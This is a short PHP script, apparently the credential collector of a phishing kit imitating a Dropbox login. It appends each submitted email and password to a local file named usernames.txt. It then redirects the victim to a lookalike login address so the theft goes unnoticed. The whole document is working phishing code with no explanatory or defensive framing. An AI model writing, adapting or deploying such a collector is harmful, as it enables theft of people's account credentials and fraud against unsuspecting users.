<?php

file_put_contents("usernames.txt", "Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://dropbox.account.box.com/login');
exit();
